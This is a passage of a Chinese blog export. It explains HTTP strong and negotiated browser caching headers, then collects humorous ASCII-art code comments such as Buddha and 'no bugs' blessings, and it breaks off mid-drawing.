<p>强缓存是利用Expires或者Cache-Control这两个http response header实现的，它们都用来表示资源在客户端缓存的有效期。</p>
<p>Expires是http1.0提出的一个表示资源过期时间的header，它描述的是一个绝对时间，由服务器返回，用GMT格式的字符串表示，如：Expires:Thu, 31 Dec 2037 23:55:55 GMT，它的缓存原理是：</p>
<p>1）浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Expires的header，如：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-67a099b1dbbd9ede.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/378/format/webp" alt="image"></p>
<p>2）浏览器在接收到这个资源后，会把这个资源连同所有response header一起缓存下来（所以缓存命中的请求返回的header并不是来自服务器，而是来自之前缓存的header）；</p>
<p>3）浏览器再请求这个资源时，先从缓存中寻找，找到这个资源后，拿出它的Expires跟当前的请求时间比较，如果请求时间在Expires指定的时间之前，就能命中缓存，否则就不行。</p>
<p>4）如果缓存没有命中，浏览器直接从服务器加载资源时，Expires Header在重新加载的时候会被更新。</p>
<p>Expires是较老的强缓存管理header，由于它是服务器返回的一个绝对时间，在服务器时间与客户端时间相差较大时，缓存管理容易出现问题，比如随意修改下客户端时间，就能影响缓存命中的结果。所以在http1.1的时候，提出了一个新的header，就是Cache-Control，这是一个相对时间，在配置缓存的时候，以秒为单位，用数值表示，如：Cache-Control:max-age=315360000，它的缓存原理是：</p>
<p>1）浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Cache-Control的header，如：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e1e928ebfb43cf14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/551/format/webp" alt="image"></p>
<p>2）浏览器在接收到这个资源后，会把这个资源连同所有response header一起缓存下来；</p>
<p>3）浏览器再请求这个资源时，先从缓存中寻找，找到这个资源后，根据它第一次的请求时间和Cache-Control设定的有效期，计算出一个资源过期时间，再拿这个过期时间跟当前的请求时间比较，如果请求时间在过期时间之前，就能命中缓存，否则就不行。</p>
<p>4）如果缓存没有命中，浏览器直接从服务器加载资源时，Cache-Control Header在重新加载的时候会被更新。</p>
<p>Cache-Control描述的是一个相对时间，在进行缓存命中的时候，都是利用客户端时间进行判断，所以相比较Expires，Cache-Control的缓存管理更有效，安全一些。</p>
<p>这两个header可以只启用一个，也可以同时启用，当response header中，Expires和Cache-Control同时存在时，Cache-Control优先级高于Expires：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-05a82b4ae250487a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/491/format/webp" alt="image"></p>
<p>3. 强缓存的管理</p>
<p>前面介绍的是强缓存的原理，在实际应用中我们会碰到需要强缓存的场景和不需要强缓存的场景，通常有2种方式来设置是否启用强缓存：</p>
<p>1）通过代码的方式，在web服务器返回的响应中添加Expires和Cache-Control Header；</p>
<p>2）通过配置web服务器的方式，让web服务器在响应资源的时候统一添加Expires和Cache-Control Header。</p>
<p>比如在javaweb里面，我们可以使用类似下面的代码设置强缓存：</p>
<p><a href="https://link.jianshu.com/?t=javascript:;">+ View code</a></p>
<p>还可以通过类似下面的java代码设置不启用强缓存：</p>
<p><a href="https://link.jianshu.com/?t=javascript:;">+ View code</a></p>
<p>tomcat还提供了一个ExpiresFilter专门用来配置强缓存，具体使用的方式可参考tomcat的官方文档：<a href="https://link.jianshu.com/?t=http://tomcat.apache.org/tomcat-7.0-doc/config/filter.html%23Expires_Filter">http://tomcat.apache.org/tomcat-7.0-doc/config/filter.html#Expires_Filter</a></p>
<p>nginx和apache作为专业的web服务器，都有专门的配置文件，可以配置expires和cache-control，这方面的知识，如果你对运维感兴趣的话，可以在百度上搜索“nginx 设置 expires cache-control”或“apache 设置 expires cache-control”都能找到不少相关的文章。</p>
<p>由于在开发的时候不会专门去配置强缓存，而浏览器又默认会缓存图片，css和js等静态资源，所以开发环境下经常会因为强缓存导致资源没有及时更新而看不到最新的效果，解决这个问题的方法有很多，常用的有以下几种：</p>
<p>1）直接ctrl+f5，这个办法能解决页面直接引用的资源更新的问题；</p>
<p>2）使用浏览器的隐私模式开发；</p>
<p>3）如果用的是chrome，可以f12在network那里把缓存给禁掉（这是个非常有效的方法）：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d4447787f6dd2cdb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/687/format/webp" alt="image"></p>
<p>4）在开发阶段，给资源加上一个动态的参数，如css/index.css?v=0.0001，由于每次资源的修改都要更新引用的位置，同时修改参数的值，所以操作起来不是很方便，除非你是在动态页面比如jsp里开发就可以用服务器变量来解决（v=${sysRnd}），或者你能用一些前端的构建工具来处理这个参数修改的问题；</p>
<p>5）如果资源引用的页面，被嵌入到了一个iframe里面，可以在iframe的区域右键单击重新加载该页面，以chrome为例：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-91bd6528ce390f9a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/280/format/webp" alt="image"></p>
<p>6）如果缓存问题出现在ajax请求中，最有效的解决办法就是ajax的请求地址追加随机数；</p>
<p>7）还有一种情况就是动态设置iframe的src时，有可能也会因为缓存问题，导致看不到最新的效果，这时候在要设置的src后面添加随机数也能解决问题；</p>
<p>8）如果你用的是grunt和gulp这种前端工具开发，通过它们的插件比如grunt-contrib-connect来启动一个静态服务器，则完全不用担心开发阶段的资源更新问题，因为在这个静态服务器下的所有资源返回的respone header中，cache-control始终被设置为不缓存：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-811c2c36bf5d419b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/523/format/webp" alt="image"></p>
<p>4. 强缓存的应用</p>
<p>强缓存是前端性能优化最有力的工具，没有之一，对于有大量静态资源的网页，一定要利用强缓存，提高响应速度。通常的做法是，为这些静态资源全部配置一个超时时间超长的Expires或Cache-Control，这样用户在访问网页时，只会在第一次加载时从服务器请求静态资源，其它时候只要缓存没有失效并且用户没有强制刷新的条件下都会从自己的缓存中加载，比如前面提到过的京东首页缓存的资源，它的缓存过期时间都设置到了2026年：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b92722283de1422c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/491/format/webp" alt="image"></p>
<p>然而这种缓存配置方式会带来一个新的问题，就是发布时资源更新的问题，比如某一张图片，在用户访问第一个版本的时候已经缓存到了用户的电脑上，当网站发布新版本，替换了这个图片时，已经访问过第一个版本的用户由于缓存的设置，导致在默认的情况下不会请求服务器最新的图片资源，除非他清掉或禁用缓存或者强制刷新，否则就看不到最新的图片效果。</p>
<p>这个问题已经有成熟的解决方案，具体内容可阅读知乎这篇文章详细了解：</p>
<p><a href="https://link.jianshu.com/?t=http://www.zhihu.com/question/20790576">http://www.zhihu.com/question/20790576</a></p>
<p>文章提到的东西都属于理论上的解决方案，不过现在已经有很多前端工具能够实际地解决这个问题，由于每个工具涉及到的内容细节都有很多，本文没有办法一一深入介绍。有兴趣的可以去了解下grunt gulp webpack fis 还有edp这几个工具，基于这几个工具都能解决这个问题，尤其是fis和edp是百度推出的前端开发平台，有现成的文档可以参考：</p>
<p><a href="https://link.jianshu.com/?t=http://fis.baidu.com/fis3/api/index.html">http://fis.baidu.com/fis3/api/index.html</a></p>
<p><a href="https://link.jianshu.com/?t=http://ecomfe.github.io/edp/doc/initialization/install/">http://ecomfe.github.io/edp/doc/initialization/install/</a></p>
<p>强缓存还有一点需要注意的是，通常都是针对静态资源使用，动态资源需要慎用，除了服务端页面可以看作动态资源外，那些引用静态资源的html也可以看作是动态资源，如果这种html也被缓存，当这些html更新之后，可能就没有机制能够通知浏览器这些html有更新，尤其是前后端分离的应用里，页面都是纯html页面，每个访问地址可能都是直接访问html页面，这些页面通常不加强缓存，以保证浏览器访问这些页面时始终请求服务器最新的资源。</p>
<p>5. 协商缓存的原理</p>
<p>当浏览器对某个资源的请求没有命中强缓存，就会发一个请求到服务器，验证协商缓存是否命中，如果协商缓存命中，请求响应返回的http状态为304并且会显示一个Not Modified的字符串，比如你打开京东的首页，按f12打开开发者工具，再按f5刷新页面，查看network，可以看到有不少请求就是命中了协商缓存的：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d585f64198f3d8ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800/format/webp" alt="image"></p>
<p>查看单个请求的Response Header，也能看到304的状态码和Not Modified的字符串，只要看到这个就可说明这个资源是命中了协商缓存，然后从客户端缓存中加载的，而不是服务器最新的资源：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-545761fa0143432f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/777/format/webp" alt="image"></p>
<p>协商缓存是利用的是【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】这两对Header来管理的。</p>
<p>【Last-Modified，If-Modified-Since】的控制缓存的原理是：</p>
<p>1）浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Last-Modified的header，这个header表示这个资源在服务器上的最后修改时间：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-064d4be1e2d4195b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/418/format/webp" alt="image"></p>
<p>2）浏览器再次跟服务器请求这个资源时，在request的header上加上If-Modified-Since的header，这个header的值就是上一次请求时返回的Last-Modified的值：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d0e283cc3dbceee9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/844/format/webp" alt="image"></p>
<p>3）服务器再次收到资源请求时，根据浏览器传过来If-Modified-Since和资源在服务器上的最后修改时间判断资源是否有变化，如果没有变化则返回304 Not Modified，但是不会返回资源内容；如果有变化，就正常返回资源内容。当服务器返回304 Not Modified的响应时，response header中不会再添加Last-Modified的header，因为既然资源没有变化，那么Last-Modified也就不会改变，这是服务器返回304时的response header：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-32766c5eab8824f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/380/format/webp" alt="image"></p>
<p>4）浏览器收到304的响应后，就会从缓存中加载资源。</p>
<p>5）如果协商缓存没有命中，浏览器直接从服务器加载资源时，Last-Modified Header在重新加载的时候会被更新，下次请求时，If-Modified-Since会启用上次返回的Last-Modified值。</p>
<p>【Last-Modified，If-Modified-Since】都是根据服务器时间返回的header，一般来说，在没有调整服务器时间和篡改客户端缓存的情况下，这两个header配合起来管理协商缓存是非常可靠的，但是有时候也会服务器上资源其实有变化，但是最后修改时间却没有变化的情况，而这种问题又很不容易被定位出来，而当这种情况出现的时候，就会影响协商缓存的可靠性。所以就有了另外一对header来管理协商缓存，这对header就是【ETag、If-None-Match】。它们的缓存管理的方式是：</p>
<p>1）浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上ETag的header，这个header是服务器根据当前请求的资源生成的一个唯一标识，这个唯一标识是一个字符串，只要资源有变化这个串就不同，跟最后修改时间没有关系，所以能很好的补充Last-Modified的问题：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-6653a932aa13d102.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/398/format/webp" alt="image"></p>
<p>2）浏览器再次跟服务器请求这个资源时，在request的header上加上If-None-Match的header，这个header的值就是上一次请求时返回的ETag的值：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-04c00f2b3b7a9aac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/822/format/webp" alt="image"></p>
<p>3）服务器再次收到资源请求时，根据浏览器传过来If-None-Match和然后再根据资源生成一个新的ETag，如果这两个值相同就说明资源没有变化，否则就是有变化；如果没有变化则返回304 Not Modified，但是不会返回资源内容；如果有变化，就正常返回资源内容。与Last-Modified不一样的是，当服务器返回304 Not Modified的响应时，由于ETag重新生成过，response header中还会把这个ETag返回，即使这个ETag跟之前的没有变化：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-37c4c3c9c51fccbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/374/format/webp" alt="image"></p>
<p>4）浏览器收到304的响应后，就会从缓存中加载资源。</p>
<p>6. 协商缓存的管理</p>
<p>协商缓存跟强缓存不一样，强缓存不发请求到服务器，所以有时候资源更新了浏览器还不知道，但是协商缓存会发请求到服务器，所以资源是否更新，服务器肯定知道。大部分web服务器都默认开启协商缓存，而且是同时启用【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】，比如apache:</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-692989d5bf667513.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/468/format/webp" alt="image"></p>
<p>如果没有协商缓存，每个到服务器的请求，就都得返回资源内容，这样服务器的性能会极差。</p>
<p>【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】一般都是同时启用，这是为了处理Last-Modified不可靠的情况。有一种场景需要注意：</p>
<p>分布式系统里多台机器间文件的Last-Modified必须保持一致，以免负载均衡到不同机器导致比对失败；</p>
<p>分布式系统尽量关闭掉ETag(每台机器生成的ETag都会不一样）；</p>
<p>京东页面的资源请求，返回的repsones header就只有Last-Modified，没有ETag：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d101e2dafb7f8ca7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/600/format/webp" alt="image"></p>
<p>协商缓存需要配合强缓存使用，你看前面这个截图中，除了Last-Modified这个header，还有强缓存的相关header，因为如果不启用强缓存的话，协商缓存根本没有意义。</p>
<p>7. 浏览器行为对缓存的影响</p>
<p>如果资源已经被浏览器缓存下来，在缓存失效之前，再次请求时，默认会先检查是否命中强缓存，如果强缓存命中则直接读取缓存，如果强缓存没有命中则发请求到服务器检查是否命中协商缓存，如果协商缓存命中，则告诉浏览器还是可以从缓存读取，否则才从服务器返回最新的资源。这是默认的处理方式，这个方式可能被浏览器的行为改变：</p>
<p>1）当ctrl+f5强制刷新网页时，直接从服务器加载，跳过强缓存和协商缓存；</p>
<p>2）当f5刷新网页时，跳过强缓存，但是会检查协商缓存；</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>程序猿 神注释！恶搞注释！</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E7%A8%8B%E5%BA%8F%E7%8C%BF-%E7%A5%9E%E6%B3%A8%E9%87%8A%EF%BC%81%E6%81%B6%E6%90%9E%E6%B3%A8%E9%87%8A%EF%BC%81/</url>
    <content><![CDATA[<p>几个 比较优秀的注释！最后面会插播制作方法！！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***                                                                          </span><br><span class="line"> *          .,:,,,                                        .::,,,::.          </span><br><span class="line"> *        .::::,,;;,                                  .,;;:,,....:i:         </span><br><span class="line"> *        :i,.::::,;i:.      ....,,:::::::::,....   .;i:,.  ......;i.        </span><br><span class="line"> *        :;..:::;::::i;,,:::;:,,,,,,,,,,..,.,,:::iri:. .,:irsr:,.;i.        </span><br><span class="line"> *        ;;..,::::;;;;ri,,,.                    ..,,:;s1s1ssrr;,.;r,        </span><br><span class="line"> *        :;. ,::;ii;:,     . ...................     .;iirri;;;,,;i,        </span><br><span class="line"> *        ,i. .;ri:.   ... ............................  .,,:;:,,,;i:        </span><br><span class="line"> *        :s,.;r:... ....................................... .::;::s;        </span><br><span class="line"> *        ,1r::. .............,,,.,,:,,........................,;iir;        </span><br><span class="line"> *        ,s;...........     ..::.,;:,,.          ...............,;1s        </span><br><span class="line"> *       :i,..,.              .,:,,::,.          .......... .......;1,       </span><br><span class="line"> *      ir,....:rrssr;:,       ,,.,::.     .r5S9989398G95hr;. ....,.:s,      </span><br><span class="line"> *     ;r,..,s9855513XHAG3i   .,,,,,,,.  ,S931,.,,.;s;s&amp;BHHA8s.,..,..:r:     </span><br><span class="line"> *    :r;..rGGh,  :SAG;;G@BS:.,,,,,,,,,.r83:      hHH1sXMBHHHM3..,,,,.ir.    </span><br><span class="line"> *   ,si,.1GS,   sBMAAX&amp;MBMB5,,,,,,:,,.:&amp;8       3@HXHBMBHBBH#X,.,,,,,,rr    </span><br><span class="line"> *   ;1:,,SH:   .A@&amp;&amp;B#&amp;8H#BS,,,,,,,,,.,5XS,     3@MHABM&amp;59M#As..,,,,:,is,   </span><br><span class="line"> *  .rr,,,;9&amp;1   hBHHBB&amp;8AMGr,,,,,,,,,,,:h&amp;&amp;9s;   r9&amp;BMHBHMB9:  . .,,,,;ri.  </span><br><span class="line"> *  :1:....:5&amp;XSi;r8BMBHHA9r:,......,,,,:ii19GG88899XHHH&amp;GSr.      ...,:rs.  </span><br><span class="line"> *  ;s.     .:sS8G8GG889hi.        ....,,:;:,.:irssrriii:,.        ...,,i1,  </span><br><span class="line"> *  ;1,         ..,....,,isssi;,        .,,.                      ....,.i1,  </span><br><span class="line"> *  ;h:               i9HHBMBBHAX9:         .                     ...,,,rs,  </span><br><span class="line"> *  ,1i..            :A#MBBBBMHB##s                             ....,,,;si.  </span><br><span class="line"> *  .r1,..        ,..;3BMBBBHBB#Bh.     ..                    ....,,,,,i1;   </span><br><span class="line"> *   :h;..       .,..;,1XBMMMMBXs,.,, .. :: ,.               ....,,,,,,ss.   </span><br><span class="line"> *    ih: ..    .;;;, ;;:s58A3i,..    ,. ,.:,,.             ...,,,,,:,s1,    </span><br><span class="line"> *    .s1,....   .,;sh,  ,iSAXs;.    ,.  ,,.i85            ...,,,,,,:i1;     </span><br><span class="line"> *     .rh: ...     rXG9XBBM#M#MHAX3hss13&amp;&amp;HHXr         .....,,,,,,,ih;      </span><br><span class="line"> *      .s5: .....    i598X&amp;&amp;A&amp;AAAAAA&amp;XG851r:       ........,,,,:,,sh;       </span><br><span class="line"> *      . ihr, ...  .         ..                    ........,,,,,;11:.       </span><br><span class="line"> *         ,s1i. ...  ..,,,..,,,.,,.,,.,..       ........,,.,,.;s5i.         </span><br><span class="line"> *          .:s1r,......................       ..............;shs,           </span><br><span class="line"> *          . .:shr:.  ....                 ..............,ishs.             </span><br><span class="line"> *              .,issr;,... ...........................,is1s;.               </span><br><span class="line"> *                 .,is1si;:,....................,:;ir1sr;,                  </span><br><span class="line"> *                    ..:isssssrrii;::::::;;iirsssssr;:..                    </span><br><span class="line"> *                         .,::iiirsssssssssrri;;:.                      </span><br><span class="line"> *&#x2F;						 </span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *                    _ooOoo_</span><br><span class="line"> *                   o8888888o</span><br><span class="line"> *                   88&quot; . &quot;88</span><br><span class="line"> *                   (| -_- |)</span><br><span class="line"> *                    O\ &#x3D; &#x2F;O</span><br><span class="line"> *                ____&#x2F;&#96;---&#39;\____</span><br><span class="line"> *              .   &#39; \\| |&#x2F;&#x2F; &#96;.</span><br><span class="line"> *               &#x2F; \\||| : |||&#x2F;&#x2F; \</span><br><span class="line"> *             &#x2F; _||||| -:- |||||- \</span><br><span class="line"> *               | | \\\ - &#x2F;&#x2F;&#x2F; | |</span><br><span class="line"> *             | \_| &#39;&#39;\---&#x2F;&#39;&#39; | |</span><br><span class="line"> *              \ .-\__ &#96;-&#96; ___&#x2F;-. &#x2F;</span><br><span class="line"> *           ___&#96;. .&#39; &#x2F;--.--\ &#96;. . __</span><br><span class="line"> *        .&quot;&quot; &#39;&lt; &#96;.___\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.</span><br><span class="line"> *       | | : &#96;- \&#96;.;&#96;\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |</span><br><span class="line"> *         \ \ &#96;-. \_ __\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;</span><br><span class="line"> * &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> *                    &#96;&#x3D;---&#x3D;&#39;</span><br><span class="line"> *</span><br><span class="line"> * .............................................</span><br><span class="line"> *          佛祖保佑             永无BUG</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> * _ooOoo_</span><br><span class="line"> * o8888888o</span><br><span class="line"> * 88&quot; . &quot;88</span><br><span class="line"> * (| -_- |)</span><br><span class="line"> *  O\ &#x3D; &#x2F;O</span><br><span class="line"> * ___&#x2F;&#96;---&#39;\____</span><br><span class="line"> * .   &#39; \\| |&#x2F;&#x2F; &#96;.</span><br><span class="line"> * &#x2F; \\||| : |||&#x2F;&#x2F; \</span><br><span class="line"> * &#x2F; _||||| -:- |||||- \</span><br><span class="line"> * | | \\\ - &#x2F;&#x2F;&#x2F; | |</span><br><span class="line"> * | \_| &#39;&#39;\---&#x2F;&#39;&#39; | |</span><br><span class="line"> * \ .-\__ &#96;-&#96; ___&#x2F;-. &#x2F;</span><br><span class="line"> * ___&#96;. .&#39; &#x2F;--.--\ &#96;. . __</span><br><span class="line"> * .&quot;&quot; &#39;&lt; &#96;.___\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.</span><br><span class="line"> * | | : &#96;- \&#96;.;&#96;\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |</span><br><span class="line"> * \ \ &#96;-. \_ __\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;</span><br><span class="line"> * &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> * &#96;&#x3D;---&#x3D;&#39;</span><br><span class="line"> *          .............................................</span><br><span class="line"> *           佛曰：bug泛滥，我已瘫痪！</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *</span><br><span class="line"> *   █████▒█    ██  ▄████▄   ██ ▄█▀       ██████╗ ██╗   ██╗ ██████╗</span><br><span class="line"> * ▓██   ▒ ██  ▓██▒▒██▀ ▀█   ██▄█▒        ██╔══██╗██║   ██║██╔════╝</span><br><span class="line"> * ▒████ ░▓██  ▒██░▒▓█    ▄ ▓███▄░        ██████╔╝██║   ██║██║  ███╗</span><br><span class="line"> * ░▓█▒  ░▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄        ██╔══██╗██║   ██║██║   ██║</span><br><span class="line"> * ░▒█░   ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄       ██████╔╝╚██████╔╝╚██████╔╝</span><br><span class="line"> *  ▒ ░   ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒       ╚═════╝  ╚═════╝  ╚═════╝</span><br><span class="line"> *  ░     ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░</span><br><span class="line"> *  ░ ░    ░░░ ░ ░ ░        ░ ░░ ░</span><br><span class="line"> *           ░     ░ ░      ░  ░</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *                    .::::.</span><br><span class="line"> *                  .::::::::.</span><br><span class="line"> *                 :::::::::::  FUCK YOU</span><br><span class="line"> *             ..:::::::::::&#39;</span><br><span class="line"> *           &#39;::::::::::::&#39;</span><br><span class="line"> *             .::::::::::</span><br><span class="line"> *        &#39;::::::::::::::..</span><br><span class="line"> *             ..::::::::::::.</span><br><span class="line"> *           &#96;&#96;::::::::::::::::</span><br><span class="line"> *            ::::&#96;&#96;:::::::::&#39;        .:::.</span><br><span class="line"> *           ::::&#39;   &#39;:::::&#39;       .::::::::.</span><br><span class="line"> *         .::::&#39;      ::::     .:::::::&#39;::::.</span><br><span class="line"> *        .:::&#39;       :::::  .:::::::::&#39; &#39;:::::.</span><br><span class="line"> *       .::&#39;        :::::.:::::::::&#39;      &#39;:::::.</span><br><span class="line"> *      .::&#39;         ::::::::::::::&#39;         &#96;&#96;::::.</span><br><span class="line"> *  ...:::           ::::::::::::&#39;              &#96;&#96;::.</span><br><span class="line"> * &#96;&#96;&#96;&#96; &#39;:.          &#39;:::::::::&#39;                  ::::..</span><br><span class="line"> *                    &#39;.:::::&#39;                    &#39;:&#39;&#96;&#96;&#96;&#96;..</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *  佛曰:</span><br><span class="line"> *          写字楼里写字间，写字间里程序员；</span><br><span class="line"> *          程序人员写程序，又拿程序换酒钱。</span><br><span class="line"> *          酒醒只在网上坐，酒醉还来网下眠；</span><br><span class="line"> *          酒醉酒醒日复日，网上网下年复年。</span><br><span class="line"> *          但愿老死电脑间，不愿鞠躬老板前；</span><br><span class="line"> *          奔驰宝马贵者趣，公交自行程序员。</span><br><span class="line"> *          别人笑我忒疯癫，我笑自己命太贱；</span><br><span class="line"> *          不见满街漂亮妹，哪个归得程序员？</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *      ┌─┐       ┌─┐</span><br><span class="line"> *   ┌──┘ ┴───────┘ ┴──┐</span><br><span class="line"> *   │                 │</span><br><span class="line"> *   │       ───       │</span><br><span class="line"> *   │  ─┬┘       └┬─  │</span><br><span class="line"> *   │                 │</span><br><span class="line"> *   │       ─┴─       │</span><br><span class="line"> *   │                 │</span><br><span class="line"> *   └───┐         ┌───┘</span><br><span class="line"> *       │         │</span><br><span class="line"> *       │         │</span><br><span class="line"> *       │         │</span><br><span class="line"> *       │         └──────────────┐</span><br><span class="line"> *       │                        │</span><br><span class="line"> *       │                        ├─┐</span><br><span class="line"> *       │                        ┌─┘</span><br><span class="line"> *       │                        │</span><br><span class="line"> *       └─┐  ┐  ┌───────┬──┐  ┌──┘</span><br><span class="line"> *         │ ─┤ ─┤       │ ─┤ ─┤</span><br><span class="line"> *         └──┴──┘       └──┴──┘</span><br><span class="line"> *                神兽保佑</span><br><span class="line"> *               代码无BUG!</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *                  ___&#x3D;&#x3D;&#x3D;&#x3D;-_  _-&#x3D;&#x3D;&#x3D;&#x3D;___</span><br><span class="line"> *            _--^^^#####&#x2F;&#x2F;      \\#####^^^--_</span><br><span class="line"> *         _-^##########&#x2F;&#x2F; (    ) \\##########^-_</span><br><span class="line"> *        -############&#x2F;&#x2F;  |\^^&#x2F;|  \\############-</span><br><span class="line"> *      _&#x2F;############&#x2F;&#x2F;   (@::@)   \\############\_</span><br><span class="line"> *     &#x2F;#############((     \\&#x2F;&#x2F;     ))#############\</span><br><span class="line"> *    -###############\\    (oo)    &#x2F;&#x2F;###############-</span><br><span class="line"> *   -#################\\  &#x2F; VV \  &#x2F;&#x2F;#################-</span><br><span class="line"> *  -###################\\&#x2F;      \&#x2F;&#x2F;###################-</span><br><span class="line"> * _#&#x2F;|##########&#x2F;\######(   &#x2F;\   )######&#x2F;\##########|\#_</span><br><span class="line"> * |&#x2F; |#&#x2F;\#&#x2F;\#&#x2F;\&#x2F;  \#&#x2F;\##\  |  |  &#x2F;##&#x2F;\#&#x2F;  \&#x2F;\#&#x2F;\#&#x2F;\#| \|</span><br><span class="line"> * &#96;  |&#x2F;  V  V  &#96;   V  \#\| |  | |&#x2F;#&#x2F;  V   &#39;  V  V  \|  &#39;</span><br><span class="line"> *    &#96;   &#96;  &#96;      &#96;   &#x2F; | |  | | \   &#39;      &#39;  &#39;   &#39;</span><br><span class="line"> *                     (  | |  | |  )</span><br><span class="line"> *                    __\ | |  | | &#x2F;__</span><br><span class="line"> *                   (vvv(VVV)(VVV)vvv)                </span><br><span class="line"> *                        神兽保佑</span><br><span class="line"> *                       代码无BUG!</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> *</span><br><span class="line"> *</span><br><span class="line"> *                                                    __----~~~~~~~~~~~------___</span><br><span class="line"> *                                   .  .   ~~&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;......          __--~ ~~</span><br><span class="line"> *                   -.            \_|&#x2F;&#x2F;     |||\\  ~~~~~~::::... &#x2F;~</span><br><span class="line"> *                ___-&#x3D;&#x3D;_       _-~o~  \&#x2F;    |||  \\            _&#x2F;~~-</span><br><span class="line"> *        __---~~~.&#x3D;&#x3D;~||\&#x3D;_    -_--~&#x2F;_-~|-   |\\   \\        _&#x2F;~</span><br><span class="line"> *    _-~~     .&#x3D;~    |  \\-_    &#39;-~7  &#x2F;-   &#x2F;  ||    \      &#x2F;</span><br><span class="line"> *  .~       .~       |   \\ -_    &#x2F;  &#x2F;-   &#x2F;   ||      \   &#x2F;</span><br><span class="line"> * &#x2F;  ____  &#x2F;         |     \\ ~-_&#x2F;  &#x2F;|- _&#x2F;   .||       \ &#x2F;</span><br><span class="line"> * |~~    ~~|--~~~~--_ \     ~&#x3D;&#x3D;-&#x2F;   | \~--&#x3D;&#x3D;&#x3D;~~        .\</span><br><span class="line"> *          &#39;         ~-|      &#x2F;|    |-~\~~       __--~~</span><br><span class="line"> *                      |-~~-_&#x2F; |    |   ~\_   _-~            &#x2F;\</span><br><span class="line"> *                           &#x2F;  \     \__   \&#x2F;~                \__</span><br><span class="line"> *                       _--~ _&#x2F; | 